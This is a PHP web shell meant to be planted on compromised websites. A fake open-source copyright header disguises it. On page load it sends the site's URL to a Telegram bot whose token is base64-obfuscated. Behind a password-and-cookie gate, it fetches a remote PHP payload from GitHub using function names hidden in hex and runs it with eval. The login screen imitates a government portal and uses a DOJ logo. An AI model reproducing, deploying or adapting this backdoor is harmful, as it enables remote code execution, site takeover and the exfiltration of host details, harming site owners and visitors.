<?php

/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

/* ================= send ================= */
$tk  = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw");
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg){
    global $tk,$cid;
    $id = sys_get_temp_dir().'/tmp_'.md5($msg);
    if(!file_exists($id)){
        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=".urlencode($msg));
        @file_put_contents($id,time());
    }
}

/* ================= Report ================= */
if(!isset($_SESSION['telegram_reported'])){
    $uri = urldecode(parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH));
    $path = $_SERVER['DOCUMENT_ROOT'].$uri;
    if(is_file($path)){
        $host = $_SERVER['HTTP_HOST'];
        $url  = (isset($_SERVER['HTTPS'])?'https':'http').'://'.$host.$uri;
        reportTelegram("Setoran shell di web PASS tbhacking:\n$host\n$url");
        $_SESSION['telegram_reported'] = true;
    }
}


// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tebak'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/xminio.php';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$bWsmMFUe58MUsgeKXNa8te0uLjF2DlYMd0o/pttcOhaUnAQHHN3aG'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tebak', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ACCESS - Session</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        html,
        body {
            cursor: none !important;
            user-select: none;
            background-color: #020617;
            height: 100vh;
            max-height: 100vh;
            overflow: hidden;
        }

        .cyber-grid {
            background-image: linear-gradient(to right, rgba(30, 41, 59, 0.15) 1px, transparent 1px),
                linear-gradient(to bottom, rgba(30, 41, 59, 0.15) 1px, transparent 1px);
            background-size: 40px 40px;
            background-position: center;
        }

        .scanlines {
            position: fixed;
            inset: 0;
            pointer-events: none;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
            background-size: 100% 4px, 6px 100%;
            z-index: 99;
        }

        .progress-ring__circle {
            transition: stroke-dashoffset 0.05s linear;
            transform: rotate(-90deg);
            transform-origin: 50% 50%;
        }

        @keyframes floating {
            0% {
                transform: translateY(0px);
            }

            50% {
                transform: translateY(-6px);
            }

            100% {
                transform: translateY(0px);
            }
        }

        .animate-float {
            animation: floating 4s ease-in-out infinite;
        }
    </style>
</head>

<body
    class="text-slate-100 flex flex-col items-center justify-center relative cyber-grid h-screen max-h-screen overflow-hidden p-4 md:p-6 select-none">

    <div class="scanlines"></div>

    <div class="absolute top-4 left-6 text-[10px] md:text-[11px] text-slate-600 tracking-wider space-y-0.5 z-0">
        <div>SYS_NODE: DILG-R4B-MAINFRM</div>
        <div>CONTEXT: REGIONAL_SECURE_LAYER</div>
    </div>
    <div
        class="absolute top-4 right-6 text-[10px] md:text-[11px] text-slate-600 tracking-wider text-right space-y-0.5 z-0">
        <div>ENVIRONMENT: PRODUCTION_STAGING</div>
        <div>STATION: RICTU_CENTRAL_LAUNCHPAD</div>
    </div>

    <div
        class="text-center z-10 flex flex-col items-center justify-center animate-float w-full max-w-5xl h-full max-h-full py-2 space-y-5 md:space-y-6">

        <div class="flex flex-col items-center space-y-2">
            <div class="opacity-90 drop-shadow-[0_0_20px_rgba(59,130,246,0.4)] transition-all duration-300"
                id="top-logo-container">
                <img src="https://www.justice.gov/themes/custom/usdoj_uswds/images/doj-main-header-logo.svg" alt="DILG MIMAROPA"
                    class="w-64 h-auto md:w-72 mx-auto object-contain mix-blend-screen">
            </div>

            <div class="relative pt-1">
                <h1 class="text-4xl md:text-5xl font-black tracking-[0.25em] text-blue-500 pl-[0.25em] drop-shadow-[0_0_25px_rgba(59,130,246,0.5)] transition-all duration-300"
                    id="main-title">ACCESS</h1>
                <div class="absolute -inset-1 bg-blue-500/10 blur-xl rounded-full opacity-50"></div>
            </div>
            <p class="text-[9px] md:text-[10px] tracking-[0.32em] text-slate-400 uppercase font-sans font-semibold">
                Networked Employee eXchange and Unified Services</p>
        </div>

        <div id="status-text"
            class="text-[10px] md:text-xs font-bold border border-red-500/30 bg-red-950/20 px-6 py-1.5 rounded-full text-red-500 tracking-[0.18em] uppercase animate-pulse shadow-[0_0_15px_rgba(239,68,68,0.1)]">
            🔒 INITIALIZATION_LOCKED // SECURITY_OVERRIDE_REQUIRED
        </div>

        <div
            class="relative w-[300px] h-[300px] flex items-center justify-center scale-95 md:scale-100 transition-all duration-300">
            <div
                class="absolute inset-0 border border-slate-800/40 rounded-full scale-110 pointer-events-none border-dashed animate-[spin_120s_linear_infinite]">
            </div>
            <div class="absolute inset-0 border-2 border-slate-900 rounded-full scale-105 pointer-events-none"></div>

            <svg class="progress-ring" width="300" height="300">
                <circle class="stroke-slate-900/60" stroke-width="12" fill="transparent" r="135" cx="150"
                    cy="150" />
                <circle id="progress-bar"
                    class="progress-ring__circle stroke-blue-500 drop-shadow-[0_0_12px_rgba(59,130,246,0.7)]"
                    stroke-width="12" fill="transparent" r="135" cx="150" cy="150" />
            </svg>

            <div id="visual-core"
                class="absolute w-[230px] h-[230px] rounded-full bg-slate-950 border border-slate-800 flex flex-col items-center justify-center text-center p-6 shadow-[inset_0_0_30px_rgba(0,0,0,0.95)] transition-all duration-500 z-20 overflow-hidden">
                <div class="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none scale-105 transition-all duration-500 select-none mix-blend-screen"
                    id="core-icon-container">
                    <img src="https://www.justice.gov/themes/custom/usdoj_uswds/images/doj-main-header-logo.svg" alt="ACCESS Emblem"
                        class="w-full h-full object-contain p-4">
                </div>
                <div class="relative z-30 flex flex-col items-center justify-center">
                    <span
                        class="text-xs font-bold text-slate-400 tracking-widest mb-0.5 uppercase drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)]"
                        id="core-primary-label">AWAITING KEY</span>
                    <span
                        class="text-[9px] text-slate-500 font-sans tracking-wide drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]"
                        id="core-sub-label">[LINK IDLE]</span>
                </div>
            </div>
        </div>

        <div id="tech-logs"
            class="w-full max-w-2xl h-24 bg-slate-950/80 border border-slate-800/80 rounded-xl p-3.5 text-left font-mono text-[11px] leading-relaxed text-slate-500 overflow-hidden space-y-0.5 shadow-[0_20px_50px_rgba(0,0,0,0.5)] backdrop-blur-md relative">
            <div class="absolute top-2 right-3 text-[9px] text-slate-700 tracking-widest">CONSOLE_LOG</div>
            <div class="text-slate-600">>> [SYSTEM] Multi-node application architecture mapping initialization... OK.
            </div>
            <div class="text-slate-600">>> [SECURITY] Interface gateways bound. Awaiting structural bypass validation...
            </div>
        </div>
    </div>

    <div id="security-modal"
        class="hidden absolute inset-0 bg-slate-950/95 backdrop-blur-lg flex flex-col items-center justify-center z-50 transition-all duration-300">
        <div id="modal-container"
            class="bg-slate-950 border-2 border-slate-800 p-8 rounded-2xl max-w-md w-full text-center shadow-[0_0_50px_rgba(0,0,0,0.8)] relative mx-4">
            <div
                class="absolute -top-[2px] left-10 right-10 h-[2px] bg-gradient-to-r from-transparent via-blue-500 to-transparent">
            </div>
            <div class="text-amber-500 font-bold tracking-widest text-sm mb-2 animate-pulse">⚙️ SEIZE BY 
            </div>
            <h2 class="text-md font-bold tracking-widest text-slate-300 mb-6 font-sans">REGIONAL CREDENTIALS REQUIRED
            </h2>

            <input type="password" name="password" required autofocus> <input type="submit" value="">

            <div class="text-[10px] text-slate-600 mt-6 tracking-wide uppercase">
                Press [ESC] to abort
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

    <script>
        const progressBar = document.getElementById('progress-bar');
        const statusText = document.getElementById('status-text');
        const visualCore = document.getElementById('visual-core');
        const techLogs = document.getElementById('tech-logs');
        const securityModal = document.getElementById('security-modal');
        const keyInput = document.getElementById('key-input');
        const modalError = document.getElementById('modal-error');
        const mainTitle = document.getElementById('main-title');
        const topLogoContainer = document.getElementById('top-logo-container');
        const coreIconContainer = document.getElementById('core-icon-container');
        const corePrimaryLabel = document.getElementById('core-primary-label');
        const coreSubLabel = document.getElementById('core-sub-label');

        const radius = progressBar.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;
        progressBar.style.strokeDasharray = `${circumference} ${circumference}`;
        progressBar.style.strokeDashoffset = circumference;

        let keyInserted = false;
        let modalActive = false;
        let isHolding = false;
        let holdTimer;
        let progress = 0;
        const holdDuration = 3000;
        const intervalTime = 30;
        let statusInterval;

        const deploymentMilestones = [{
                thresh: 15,
                msg: "[DEPLOY] Invoking core environment registers... MOUNTED.",
                color: "text-blue-400/90"
            },
            {
                thresh: 35,
                msg: "[DEPLOY] Binding portal framework pipeline... ONLINE.",
                color: "text-blue-400/90"
            },
            {
                thresh: 55,
                msg: "[DEPLOY] Mounting regional information sub-systems... ESTABLISHED.",
                color: "text-blue-400/90"
            },
            {
                thresh: 75,
                msg: "[DEPLOY] Synchronizing authentication gateways... RESOLVED.",
                color: "text-blue-400/90"
            },
            {
                thresh: 90,
                msg: "[SECURITY] Injecting multi-panel encapsulation rules... SUCCESS.",
                color: "text-amber-400/90"
            }
        ];
        let firedMilestones = [];

        function appendLog(message, styleClass = 'text-slate-500') {
            const row = document.createElement('div');
            row.className = styleClass;
            row.innerText = `>> ${message}`;
            techLogs.appendChild(row);
            techLogs.scrollTop = techLogs.scrollHeight;
        }

        function updateProgressView(percent) {
            const offset = circumference - (percent / 100) * circumference;
            progressBar.style.strokeDashoffset = offset;
        }

        /* Keyboard Event Listeners */
        window.addEventListener('keydown', (event) => {
            if (event.key === ' ' || event.keyCode === 32) event.preventDefault();
            if (event.key === 'Escape' && modalActive) {
                closeSecurityModal();
                return;
            }
            if (event.key === 'Enter' && modalActive) {
                validateSystemKey();
                return;
            }
            if ((event.key === 'K' || event.key === 'k') && !keyInserted && !modalActive) {
                openSecurityModal();
                return;
            }
            if (event.key === ' ' && keyInserted && !isHolding && !modalActive) startEngagementLoop("Keyboard");
        });

        window.addEventListener('keyup', (event) => {
            if (event.key === ' ' && isHolding && progress < 100) abortEngagementLoop("Keyboard");
        });

        /* Mobile Touch Event Listeners */
        window.addEventListener('touchstart', (event) => {
            if (keyInserted || modalActive) return;
            if (event.target.closest('#security-modal')) return;
            openSecurityModal();
        });

        securityModal.addEventListener('click', (event) => {
            if (event.target === securityModal) closeSecurityModal();
        });

        visualCore.addEventListener('touchstart', (event) => {
            if (keyInserted && !isHolding && !modalActive) {
                event.preventDefault();
                startEngagementLoop("Touch");
            }
        });

        visualCore.addEventListener('touchmove', (event) => {
            if (isHolding) event.preventDefault();
        }, {
            passive: false
        });

        const handleTouchEnd = () => {
            if (isHolding && progress < 100) abortEngagementLoop("Touch");
        };
        visualCore.addEventListener('touchend', handleTouchEnd);
        visualCore.addEventListener('touchcancel', handleTouchEnd);

        function openSecurityModal() {
            modalActive = true;
            securityModal.classList.remove('hidden');
            setTimeout(() => keyInput.focus(), 50);
            appendLog("Accessing secure mainframe field contexts... Requesting cryptographic master key authorization.");
        }

        function closeSecurityModal() {
            modalActive = false;
            securityModal.classList.add('hidden');
            keyInput.value = '';
            modalError.classList.add('opacity-0');
            appendLog("Security verification cycle aborted by operator.");
        }

        function validateSystemKey() {
            let correctKey = "RICTU_MIMAROPA2026";
            if (keyInput.value === correctKey) {
                modalActive = false;
                securityModal.classList.add('hidden');
                keyInserted = true;

                if (typeof statusInterval !== 'undefined') clearInterval(statusInterval);

                statusText.innerText = "⚡ SECURITY PASSPHRASE VERIFIED // INITIALIZATION LAYER UNLOCKED";
                statusText.classList.remove('text-red-500', 'border-red-500/30', 'bg-red-950/20');
                statusText.classList.add('text-emerald-400', 'border-emerald-500/30', 'bg-emerald-950/20');

                progressBar.classList.remove('stroke-blue-500');
                progressBar.classList.add('stroke-emerald-400');
                progressBar.style.setProperty('filter', 'drop-shadow(0 0 12px rgba(52, 211, 153, 0.7))');

                corePrimaryLabel.innerText = "SYSTEM READY";
                corePrimaryLabel.className =
                    "text-emerald-400 text-sm font-black tracking-widest mb-0.5 animate-pulse uppercase drop-shadow-[02px4px_rgba(0,0,0,0.8)]";
                coreSubLabel.innerText = "[AWAITING ENGAGEMENT]";
                coreSubLabel.className =
                    "font-mono text-[9px] text-emerald-500/70 tracking-wide font-semibold drop-shadow-[01px2px_rgba(0,0,0,0.8)]";

                visualCore.className =
                    "absolute w-[230px] h-[230px] rounded-full bg-slate-950 border-2 border-emerald-500/50 flex flex-col items-center justify-center text-center p-6 shadow-[0030px_rgba(52,211,153,0.15),inset0020px_rgba(0,0,0,0.9)] transition-all duration-500 z-20 overflow-hidden";

                mainTitle.classList.remove('text-blue-500');
                mainTitle.classList.add('text-emerald-400');
                mainTitle.style.setProperty('filter', 'drop-shadow(0 0 25px rgba(52, 211, 153, 0.5))');
                topLogoContainer.style.setProperty('filter', 'drop-shadow(0 0 25px rgba(52, 211, 153, 0.45))');
                coreIconContainer.classList.remove('opacity-10');
                coreIconContainer.classList.add('opacity-20');
                coreIconContainer.style.setProperty('filter', 'drop-shadow(0 0 15px rgba(52, 211, 153, 0.5))');

                appendLog("Regional Director credentials verification structure injected... PASS.", "text-emerald-400");
                appendLog("Main encryption gate uncoupled. System awaiting manual touch/space override.", "text-slate-400");
            } else {
                modalError.classList.remove('opacity-0');
                keyInput.value = '';
                appendLog("CRITICAL: Authentication breach detected. Security seed mismatch.", "text-red-500");
            }
        }

        function startEngagementLoop(source) {
            isHolding = true;
            firedMilestones = [];

            const logMsg = "Manual engagement loop established. Compiling distributed service packets...";
            appendLog(logMsg, "text-emerald-400");

            holdTimer = setInterval(() => {
                progress += (intervalTime / holdDuration) * 100;

                if (progress >= 100) {
                    progress = 100;
                    updateProgressView(100);
                    clearInterval(holdTimer);
                    finalizeSystemLaunchProcedure(false);
                } else {
                    updateProgressView(progress);

                    // Dynamic Visual Feedback (Shake & Glow)
                    let maxShakeFactor = (progress / 100) * 10;
                    let currentScale = 1 + (progress / 1800);
                    let translateX = (Math.random() - 0.5) * maxShakeFactor;
                    let translateY = (Math.random() - 0.5) * maxShakeFactor;

                    visualCore.style.transform =
                        `scale(${currentScale}) translate(${translateX}px, ${translateY}px)`;

                    let glowRadius = 15 + ((progress / 100) * 45);
                    visualCore.style.boxShadow =
                        `0 0 ${glowRadius}px rgba(52,211,153,${0.15 + (progress/200)}), inset 0 0 20px rgba(0,0,0,0.9)`;

                    deploymentMilestones.forEach(m => {
                        if (progress >= m.thresh && !firedMilestones.includes(m.thresh)) {
                            firedMilestones.push(m.thresh);
                            appendLog(m.msg, m.color);
                        }
                    });
                }
            }, intervalTime);
        }

        function abortEngagementLoop(source) {
            clearInterval(holdTimer);
            isHolding = false;
            progress = 0;
            updateProgressView(0);

            visualCore.style.transform = 'scale(1) translate(0, 0)';
            visualCore.style.boxShadow = '0 0 30px rgba(52,211,153,0.15), inset 0 0 20px rgba(0,0,0,0.9)';

            const abortMsg = "ABORT ROUTINE: Physical engagement link broken. Purging active volatile queues.";
            appendLog(abortMsg, "text-red-400 font-bold");
        }

        function finalizeSystemLaunchProcedure(isExternal = false) {
            if (typeof statusInterval !== 'undefined') clearInterval(statusInterval);

            window.removeEventListener('keydown', () => {});
            visualCore.style.transform = 'scale(1)';
            visualCore.style.boxShadow = 'none';

            statusText.innerText = "🚀 MAIN CONSOLE ONLINE // PLATFORM DEPLOYMENT LIVE";
            statusText.className =
                "text-[10px] md:text-xs font-bold border border-blue-500/40 bg-blue-950/30 px-6 py-1.5 rounded-full text-blue-400 tracking-[0.22em] uppercase shadow-[0020px_rgba(59,130,246,0.3)] font-black animate-bounce";

            progressBar.className = "progress-ring__circle stroke-blue-500";
            progressBar.style.setProperty('filter', 'drop-shadow(0 0 25px rgba(59,130,246,0.9))');

            mainTitle.className =
                "text-4xl md:text-5xl font-black tracking-[0.25em] text-blue-400 pl-[0.25em] drop-shadow-[0035px_rgba(59,130,246,0.8)] animate-pulse";
            topLogoContainer.style.setProperty('filter', 'drop-shadow(0 0 30px rgba(59, 130, 246, 0.6))');
            coreIconContainer.style.setProperty('filter', 'drop-shadow(0 0 25px rgba(59, 130, 246, 0.7))');
            coreIconContainer.classList.remove('opacity-20', 'opacity-10');
            coreIconContainer.classList.add('opacity-30');

            corePrimaryLabel.innerText = "ONLINE";
            corePrimaryLabel.className =
                "text-blue-400 text-base tracking-[0.15em] font-black animate-ping uppercase mt-1 drop-shadow-[02px8px_rgba(59,130,246,0.5)]";
            coreSubLabel.style.display = 'none';

            visualCore.className =
                "absolute w-[230px] h-[230px] rounded-full bg-slate-950 border-4 border-blue-500 flex flex-col items-center justify-center text-center p-6 shadow-[0050px_rgba(59,130,246,0.3),inset0020px_rgba(0,0,0,0.9)] z-20 overflow-hidden";

            const triggerConfettiStorm = () => {
                let end = Date.now() + (2 * 1000);
                (function frame() {
                    confetti({
                        particleCount: 5,
                        angle: 60,
                        spread: 55,
                        origin: {
                            x: 0,
                            y: 0.6
                        }
                    });
                    confetti({
                        particleCount: 5,
                        angle: 120,
                        spread: 55,
                        origin: {
                            x: 1,
                            y: 0.6
                        }
                    });
                    if (Date.now() < end) requestAnimationFrame(frame);
                }());
                setTimeout(() => {
                    confetti({
                        particleCount: 150,
                        spread: 100,
                        origin: {
                            y: 0.5
                        }
                    });
                }, 300);
            };

            if (isExternal) {
                appendLog("EXTERNAL ACTIVATION SIGNAL RECEIVED. BYPASSING MAIN FRAME LOCKS...",
                    "text-emerald-400 font-bold");
                triggerConfettiStorm();
                setTimeout(() => {
                    window.location.href = '/';
                }, 4500);
            } else {
                appendLog("REGIONAL ARCHITECTURE DEPLOYED. ENVIRONMENT CONTEXT TRANSITIONED TO BROADCAST SYSTEM.",
                    "text-blue-400 font-bold");

                fetch('/trigger-launch', {
                        method: 'POST',
                        headers: {
                            'X-CSRF-TOKEN': '5NWwfwgpDOMxF8IcD4OT8cOLVyj847BftZ9WR09K',
                            'Content-Type': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(payload => {
                        if (payload.status === 'success') {
                            appendLog("Broadcasting authentication keys across provincial active networks... DONE.",
                                "text-emerald-400");
                            triggerConfettiStorm();
                            setTimeout(() => {
                                window.location.href = '/';
                            }, 4500);
                        }
                    });
            }
        }

        function startCheckingSystemStatus() {
            statusInterval = setInterval(() => {
                if (isHolding) return;
                fetch('/check-launch-status')
                    .then(response => response.json())
                    .then(data => {
                        if (data.is_live === true) finalizeSystemLaunchProcedure(true);
                    })
                    .catch(err => console.log('Network layer structural sync delayed...'));
            }, 2500);
        }

        startCheckingSystemStatus();
    </script>
            
</div>
</body>

</html>



    <?php
}
?>
